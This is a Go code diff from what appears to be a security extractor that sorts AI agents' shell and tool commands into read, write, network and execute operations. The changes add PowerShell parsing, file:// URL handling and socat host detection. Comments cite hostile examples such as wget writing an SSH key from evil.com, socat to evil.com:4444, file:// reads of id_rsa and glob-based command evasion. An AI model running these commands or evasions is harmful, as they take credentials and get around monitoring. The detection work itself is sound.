 		// + normalizePSBackslashPaths) is the fallback when pwsh is not available.
-		if runtime.GOOS == goosWindows && e.pwshWorker == nil && looksLikePowerShell(cmd) {
+		if isNativeWindowsEnv() && e.pwshWorker == nil && looksLikePowerShell(cmd) {
 			cmd = substitutePSVariables(cmd)
 			cmd = normalizePSBackslashPaths(cmd)
 		}
@@ -1017,9 +1115,9 @@ func (e *Extractor) extractBashCommand(info *ExtractedInfo) {
 			// Bash parse failed. On Windows, try the pwsh worker as the authoritative
 			// PS parser — the command may be valid PowerShell even if bash rejects it.
 			if e.pwshWorker != nil {
-				if psResp, psErr := e.pwshWorker.parse(cmd); psErr == nil && len(psResp.ParseErrors) == 0 {
+				if psResp, psErr := e.pwshWorker.Parse(cmd); psErr == nil && len(psResp.ParseErrors) == 0 {
 					if len(psResp.Commands) > 0 {
-						e.extractFromParsedCommandsDepth(info, psResp.Commands, 0, nil)
+						e.extractFromParsedCommandsDepth(info, convertPSCommands(psResp.Commands), 0, nil)
 					}
 					// Valid PS with zero commands (comment-only, pure assignment, etc.)
 					// is harmless — do not flag as evasive.
@@ -1092,7 +1190,7 @@ func (e *Extractor) extractBashCommand(info *ExtractedInfo) {
 		// Gated on looksLikePowerShell to avoid unnecessary IPC round-trips and
 		// duplicate path entries for plain bash commands.
 		if e.pwshWorker != nil && looksLikePowerShell(cmd) {
-			psResp, psErr := e.pwshWorker.parse(cmd)
+			psResp, psErr := e.pwshWorker.Parse(cmd)
 			if psErr != nil {
 				// IPC failure means the PS subprocess crashed while parsing this
 				// command. That is suspicious for a PS-looking command — block it
@@ -1100,7 +1198,7 @@ func (e *Extractor) extractBashCommand(info *ExtractedInfo) {
 				info.Evasive = true
 				info.EvasiveReason = "pwsh worker crashed parsing command: " + psErr.Error()
 			} else if len(psResp.ParseErrors) == 0 && len(psResp.Commands) > 0 {
-				e.extractFromParsedCommandsDepth(info, psResp.Commands, 0, nil)
+				e.extractFromParsedCommandsDepth(info, convertPSCommands(psResp.Commands), 0, nil)
 			}
 			// If psResp.ParseErrors != 0 (len > 0): command is invalid PS but valid bash — allow.
 		}
@@ -1291,9 +1389,11 @@ func (e *Extractor) inferPowerShellOperation(info *ExtractedInfo, cmd string) {
 			continue
 		}
 		cmdName := stripPathPrefix(fields[0])
-		if ci, ok := e.commandDB[cmdName]; ok {
-			if operationPriority(ci.Operation) > operationPriority(info.Operation) {
-				info.Operation = ci.Operation
+		lookupName := strings.ToLower(cmdName)
+		if ci, ok := e.commandDB[lookupName]; ok {
+			info.addOperation(ci.Operation)
+			for _, op := range ci.ExtraOps {
+				info.appendExtraOp(op)
 			}
 		}
 	}
@@ -1321,9 +1421,9 @@ func (e *Extractor) parsePowerShellInnerCommand(info *ExtractedInfo, innerCmd st
 
 	// Attempt 2: pwsh worker — authoritative PS AST parser (Windows only).
 	if e.pwshWorker != nil {
-		if psResp, psErr := e.pwshWorker.parse(innerCmd); psErr == nil && len(psResp.ParseErrors) == 0 {
+		if psResp, psErr := e.pwshWorker.Parse(innerCmd); psErr == nil && len(psResp.ParseErrors) == 0 {
 			if len(psResp.Commands) > 0 {
-				e.extractFromParsedCommandsDepth(info, psResp.Commands, depth+1, nil)
+				e.extractFromParsedCommandsDepth(info, convertPSCommands(psResp.Commands), depth+1, nil)
 			}
 			// Valid PS with zero commands (comment-only, assignment-only, etc.) is
 			// harmless — return without falling through to the evasive path below.
@@ -1390,6 +1490,23 @@ const (
 	goosWindows            = "windows"
 )
 
+// convertPSCommands converts a slice of pwsh.ParsedCommand to []parsedCommand,
+// applying normalizeParsedCmdName to each command name. This is the
+// rules-layer normalization step that was previously done inside the worker.
+func convertPSCommands(pcs []pwsh.ParsedCommand) []parsedCommand {
+	out := make([]parsedCommand, len(pcs))
+	for i, pc := range pcs {
+		out[i] = parsedCommand{
+			Name:         normalizeParsedCmdName(pc.Name),
+			Args:         pc.Args,
+			RedirPaths:   pc.RedirPaths,
+			RedirInPaths: pc.RedirInPaths,
+			HasSubst:     pc.HasSubst,
+		}
+	}
+	return out
+}
+
 func (e *Extractor) extractFromParsedCommandsDepth(info *ExtractedInfo, commands []parsedCommand, depth int, parentSymtab map[string]string) {
 	for cmdIdx, pc := range commands {
 		// NOTE: HasSubst is used below to set Evasive ONLY for network/execute
@@ -1402,6 +1519,11 @@ func (e *Extractor) extractFromParsedCommandsDepth(info *ExtractedInfo, commands
 
 		// Resolve the actual command name and args, skipping wrappers like sudo/env
 		cmdName, args := e.resolveCommand(pc.Name, pc.Args)
+
+		// lookupName is lowercased for case-insensitive commandDB lookup.
+		// cmdName retains its original case for shellInterpreters, powershellInterpreters,
+		// glob detection, etc.
+		lookupName := strings.ToLower(cmdName)
 
 		// SECURITY: Glob patterns in command name position (e.g., /???/??t, ca?)
 		// bypass command DB lookup since the glob doesn't match literal entries.
@@ -1490,7 +1612,7 @@ func (e *Extractor) extractFromParsedCommandsDepth(info *ExtractedInfo, commands
 		// wrapped command has explicit args (e.g., "xargs rm -f", "xargs cat 0").
 		origBase := stripPathPrefix(pc.Name)
 		if stdinArgWrappers[origBase] && cmdName != origBase {
-			if dbInfo, ok := e.commandDB[cmdName]; ok {
+			if dbInfo, ok := e.commandDB[lookupName]; ok {
 				found := false
 				for j := range commands {
 					if j == cmdIdx {
@@ -1506,8 +1628,9 @@ func (e *Extractor) extractFromParsedCommandsDepth(info *ExtractedInfo, commands
 							}
 							info.Paths = append(info.Paths, arg)
 						}
-						if operationPriority(dbInfo.Operation) > operationPriority(info.Operation) {
-							info.Operation = dbInfo.Operation
+						info.addOperation(dbInfo.Operation)
+						for _, op := range dbInfo.ExtraOps {
+							info.appendExtraOp(op)
 						}
 						found = true
 					}
@@ -1563,10 +1686,19 @@ func (e *Extractor) extractFromParsedCommandsDepth(info *ExtractedInfo, commands
 		// HasSubst is now per-command (not file-wide), so this only fires when
 		// THIS command's args specifically had dynamic content.
 		if pc.HasSubst && len(args) == 0 {
-			if dbInfo, inDB := e.commandDB[cmdName]; inDB {
-				if dbInfo.Operation == OpNetwork || dbInfo.Operation == OpExecute {
-					if operationPriority(dbInfo.Operation) > operationPriority(info.Operation) {
-						info.Operation = dbInfo.Operation
+			if dbInfo, inDB := e.commandDB[lookupName]; inDB {
+				allOps := dbInfo.AllOperations()
+				isDangerousSubst := false
+				for _, op := range allOps {
+					if op == OpNetwork || op == OpExecute {
+						isDangerousSubst = true
+						break
+					}
+				}
+				if isDangerousSubst {
+					info.addOperation(dbInfo.Operation)
+					for _, op := range dbInfo.ExtraOps {
+						info.appendExtraOp(op)
 					}
 					if !info.Evasive {
 						info.Evasive = true
@@ -1578,27 +1710,35 @@ func (e *Extractor) extractFromParsedCommandsDepth(info *ExtractedInfo, commands
 			}
 		}
 
-		// Look up in command database
-		cmdInfo, found := e.commandDB[cmdName]
+		// Look up in command database.
+		// For [Type]::new(...) constructors, the bootstrap emits "typename::new";
+		// fall back to "typename" (strip "::new") so the type's commandDB entry matches.
+		if _, ok := e.commandDB[lookupName]; !ok && strings.HasSuffix(lookupName, "::new") {
+			lookupName = strings.TrimSuffix(lookupName, "::new")
+		}
+		cmdInfo, found := e.commandDB[lookupName]
 		if found {
-			// Use the most dangerous operation
-			if operationPriority(cmdInfo.Operation) > operationPriority(info.Operation) {
-				info.Operation = cmdInfo.Operation
+			// Register the primary operation (may upgrade info.Operation if higher priority)
+			info.addOperation(cmdInfo.Operation)
+			// Register extra operations without changing the primary classification
+			for _, op := range cmdInfo.ExtraOps {
+				info.appendExtraOp(op)
 			}
 			// Extract paths from positional arguments
 			e.extractPathsFromArgs(info, cmdName, args, cmdInfo)
 
-			// For network commands, extract hosts from all args
-			if cmdInfo.Operation == OpNetwork {
+			// For network commands (primary or extra), extract hosts from all args
+			if slices.Contains(cmdInfo.AllOperations(), OpNetwork) {
 				info.Hosts = append(info.Hosts, extractHosts(args)...)
 			}
 
 			// SECURITY: Network commands with file-upload flags (--post-file,
 			// --body-file, -d @file) are reading those files for exfiltration.
 			// Override to OpRead so file-protection rules can detect the access.
-			if cmdInfo.Operation == OpNetwork {
+			cmdHasNetwork := slices.Contains(cmdInfo.AllOperations(), OpNetwork)
+			if cmdHasNetwork {
 				if hasFileUploadFlag(cmdName, args) {
-					info.Operation = OpRead
+					info.addOperation(OpRead)
 				}
 			}
 
@@ -1606,66 +1746,28 @@ func (e *Extractor) extractFromParsedCommandsDepth(info *ExtractedInfo, commands
 			// write downloaded content to a local file. Override to OpWrite so
 			// file-protection rules can detect the write.
 			// Example: "wget -O /home/user/.ssh/id_rsa https://evil.com/key"
-			if cmdInfo.Operation == OpNetwork || info.Operation == OpNetwork {
+			if cmdHasNetwork || slices.Contains(info.Operations, OpNetwork) {
 				if hasOutputFlag(cmdName, args) {
-					info.Operation = OpWrite
+					info.addOperation(OpWrite)
 				}
 			}
 
-			// Extract hosts from scp/rsync user@host:path format
-			if cmdName == "scp" || cmdName == "rsync" {
-				for _, arg := range args {
-					if host := extractScpHost(arg); host != "" {
-						info.Hosts = append(info.Hosts, host)
-					}
-				}
-			}
-
-			// Detect tar create mode: "tar -czf archive.tar.gz dir/" is a write,
-			// not a read. Check for -c short flag or --create long flag.
-			if cmdName == "tar" {
-				for _, arg := range args {
-					if arg == "--create" {
-						if operationPriority(OpWrite) > operationPriority(info.Operation) {
-							info.Operation = OpWrite
-						}
-						break
-					}
-					if strings.HasPrefix(arg, "-") && !strings.HasPrefix(arg, "--") && strings.Contains(arg, "c") {
-						if operationPriority(OpWrite) > operationPriority(info.Operation) {
-							info.Operation = OpWrite
-						}
-						break
-					}
-				}
-			}
-
-			// Detect sed in-place mode: "sed -i 's/foo/bar/' file" modifies
-			// the file. Also handles -i.bak (suffix variant) and --in-place.
-			if cmdName == "sed" {
-				for _, arg := range args {
-					if arg == "--in-place" || (strings.HasPrefix(arg, "-i") && !strings.HasPrefix(arg, "--")) {
-						if operationPriority(OpWrite) > operationPriority(info.Operation) {
-							info.Operation = OpWrite
-						}
-						break
-					}
-				}
-			}
+			// Command-specific argument analysis (scp/rsync hosts, socat addresses,
+			// tar create mode, sed in-place). See extractor_commands.go.
+			e.applyCommandSpecificExtraction(info, cmdName, args)
 		}
 
 		// Extract paths from interpreter code strings (python -c, perl -e, etc.)
-		// When file paths are found in interpreter code, set OpRead regardless
-		// of the command DB operation. "python3 -c 'open(/home/.env)'" is
-		// primarily a file read, and file-protection rules match on read/write/
-		// delete — not execute. Without this, interpreter code bypasses all
-		// path-based security rules.
+		// When file paths are found in interpreter code, force OpRead as primary
+		// regardless of the command DB operation. "python3 -c 'open(.env)'" is
+		// primarily a file read — file-protection rules (actions:[read]) must fire.
+		// forceOperation keeps OpExecute in Operations so execute rules also fire.
 		if flag, ok := interpreterCodeFlags[cmdName]; ok {
 			if code := extractFlagValue(args, flag); code != "" {
 				paths := extractPathsFromInterpreterCode(code)
 				if len(paths) > 0 {
 					info.Paths = append(info.Paths, paths...)
-					info.Operation = OpRead
+					info.forceOperation(OpRead)
 				}
 			}
 		}
@@ -1673,17 +1775,13 @@ func (e *Extractor) extractFromParsedCommandsDepth(info *ExtractedInfo, commands
 		// Add output redirect target paths (always a write)
 		if len(pc.RedirPaths) > 0 {
 			info.Paths = append(info.Paths, pc.RedirPaths...)
-			if operationPriority(OpWrite) > operationPriority(info.Operation) {
-				info.Operation = OpWrite
-			}
+			info.addOperation(OpWrite)
 		}
 
 		// Add input redirect source paths (always a read)
 		if len(pc.RedirInPaths) > 0 {
 			info.Paths = append(info.Paths, pc.RedirInPaths...)
-			if info.Operation == OpNone {
-				info.Operation = OpRead
-			}
+			info.addOperation(OpRead)
 		}
 	}
 }
@@ -1733,7 +1831,6 @@ var wrapperCommands = map[string]bool{
 	// Misc
 	"flock":   true,
 	"busybox": true,
-	"script":  true,
 }
 
 // stdinArgWrappers are commands that read items from stdin and pass them
@@ -1843,15 +1940,14 @@ func (e *Extractor) inferGlobOperation(info *ExtractedInfo, pattern string) {
 		return
 	}
 
-	bestPriority := operationPriority(info.Operation)
 	for name, cmdInfo := range e.commandDB {
 		matched, err := path.Match(base, name)
 		if err != nil || !matched {
 			continue
 		}
-		if p := operationPriority(cmdInfo.Operation); p > bestPriority {
-			bestPriority = p
-			info.Operation = cmdInfo.Operation
+		info.addOperation(cmdInfo.Operation)
+		for _, op := range cmdInfo.ExtraOps {
+			info.appendExtraOp(op)
 		}
 	}
 }
@@ -2027,27 +2123,27 @@ func deduplicateStrings(items []string) []string {
 
 // extractReadTool extracts info from Read/read_file tool
 func (e *Extractor) extractReadTool(info *ExtractedInfo) {
-	info.Operation = OpRead
+	info.addOperation(OpRead)
 	e.extractPathFields(info)
 }
 
 // extractWriteTool extracts info from Write/write_file tool
 func (e *Extractor) extractWriteTool(info *ExtractedInfo) {
-	info.Operation = OpWrite
+	info.addOperation(OpWrite)
 	e.extractPathFields(info)
 	e.extractContentField(info)
 }
 
 // extractEditTool extracts info from Edit tool
 func (e *Extractor) extractEditTool(info *ExtractedInfo) {
-	info.Operation = OpWrite
+	info.addOperation(OpWrite)
 	e.extractPathFields(info)
 	e.extractContentField(info)
 }
 
 // extractDeleteTool extracts info from delete_file tool (Cursor)
 func (e *Extractor) extractDeleteTool(info *ExtractedInfo) {
-	info.Operation = OpDelete
+	info.addOperation(OpDelete)
 	e.extractPathFields(info)
 }
 
@@ -2078,19 +2174,20 @@ func (e *Extractor) extractUnknownTool(info *ExtractedInfo) {
 	e.extractPathFields(info)
 
 	// Step 4: If paths were found, infer operation from accompanying fields.
+	// Only infer when operation is still unknown — don't override explicit ops.
 	if len(info.Paths) > 0 && info.Operation == OpNone {
 		// Check for edit signals (old_string/new_string)
 		_, hasOld := info.RawArgs["oldstring"]
 		_, hasNew := info.RawArgs["newstring"]
 		if hasOld || hasNew {
-			info.Operation = OpWrite
+			info.addOperation(OpWrite)
 		}
 
 		// Check for write signals (content fields)
 		if info.Operation == OpNone {
 			for _, f := range knownContentFields {
 				if _, ok := info.RawArgs[f]; ok {
-					info.Operation = OpWrite
+					info.addOperation(OpWrite)
 					break
 				}
 			}
@@ -2098,7 +2195,7 @@ func (e *Extractor) extractUnknownTool(info *ExtractedInfo) {
 
 		// Path with no other signals = read
 		if info.Operation == OpNone {
-			info.Operation = OpRead
+			info.addOperation(OpRead)
 		}
 	}
 
@@ -2161,9 +2258,9 @@ func (e *Extractor) augmentFromArgShape(info *ExtractedInfo) {
 			inferredOp = OpRead
 		}
 
-		// Only upgrade, never downgrade
-		if inferredOp != OpNone && operationPriority(inferredOp) > operationPriority(info.Operation) {
-			info.Operation = inferredOp
+		// Only upgrade, never downgrade (addOperation enforces this internally)
+		if inferredOp != OpNone {
+			info.addOperation(inferredOp)
 		}
 	}
 
@@ -2179,24 +2276,25 @@ func (e *Extractor) augmentFromArgShape(info *ExtractedInfo) {
 
 // extractWebFetchTool extracts info from WebFetch tool
 func (e *Extractor) extractWebFetchTool(info *ExtractedInfo) {
-	info.Operation = OpNetwork
-
 	if val, ok := info.RawArgs["url"]; ok {
 		for _, urlStr := range fieldStrings(val) {
-			host := extractHostFromURL(urlStr)
-			if host != "" {
-				info.Hosts = append(info.Hosts, host)
+			// SECURITY: file:// URLs are local reads, not network fetches.
+			// Force OpRead so path-based rules catch file:// bypasses like
+			// "WebFetch(url: file:///home/user/.ssh/id_rsa)".
+			if p := extractPathFromFileURL(urlStr); p != "" {
+				info.Paths = append(info.Paths, p)
+				info.forceOperation(OpRead)
+				continue
 			}
-			// SECURITY: Extract path from file:// URLs so path-based rules
-			// can catch "WebFetch(url: file:///home/user/.ssh/id_rsa)".
-			// Without this, file:// URLs bypass all path rules entirely.
-			// file:// is a local read — set OpRead so path rules (which
-			// typically cover read/write/delete) can match.
-			if path := extractPathFromFileURL(urlStr); path != "" {
-				info.Paths = append(info.Paths, path)
-				info.Operation = OpRead
+			if host := extractHostFromURL(urlStr); host != "" {
+				info.Hosts = append(info.Hosts, host)
+				info.addOperation(OpNetwork)
 			}
 		}
+	}
+	// Default to OpNetwork if no URL was recognized
+	if info.Operation == OpNone {
+		info.addOperation(OpNetwork)
 	}
 }
 
@@ -2235,15 +2333,13 @@ func (e *Extractor) extractURLFields(info *ExtractedInfo) {
 				host := extractHostFromURLField(u)
 				if host != "" {
 					info.Hosts = append(info.Hosts, host)
-					if operationPriority(OpNetwork) > operationPriority(info.Operation) {
-						info.Operation = OpNetwork
-					}
+					info.addOperation(OpNetwork)
 				}
 				// SECURITY: file:// URLs in any tool's URL field are local reads.
 				// Without this, only recognized WebFetch tools get file:// extraction.
 				if p := extractPathFromFileURL(u); p != "" {
 					info.Paths = append(info.Paths, p)
-					info.Operation = OpRead
+					info.addOperation(OpRead)
 				}
 			}
 		}
@@ -3032,6 +3128,36 @@ func extractScpHost(arg string) string {
 	hostLower := strings.ToLower(hostPart)
 	if hostLower != "" && looksLikeHost(hostLower) {
 		return normalizeIPHost(hostLower)
+	}
+	return ""
+}
+
+// extractSocatHost extracts a hostname/IP from a socat address token.
+// Socat addresses look like "PROTOCOL:host:port" (e.g. "TCP:evil.com:4444",
+// "UDP:1.2.3.4:53"). Non-network addresses like "EXEC:/bin/bash" or "STDIN"
+// contain no extractable network host.
+func extractSocatHost(arg string) string {
+	if strings.HasPrefix(arg, "-") || arg == "" {
+		return ""
+	}
+	// Split on ":" — socat address is TYPE:host:port (three parts minimum).
+	parts := strings.SplitN(arg, ":", 3)
+	if len(parts) < 2 {
+		return ""
+	}
+	proto := strings.ToUpper(parts[0])
+	// Only network-type socat addresses have a host in the second field.
+	networkProtos := map[string]bool{
+		"TCP": true, "TCP4": true, "TCP6": true,
+		"UDP": true, "UDP4": true, "UDP6": true,
+		"SSL": true, "OPENSSL": true,
+	}
+	if !networkProtos[proto] {
+		return ""
+	}
+	host := strings.ToLower(parts[1])
+	if looksLikeHost(host) {
+		return normalizeIPHost(host)
 	}
 	return ""
 }
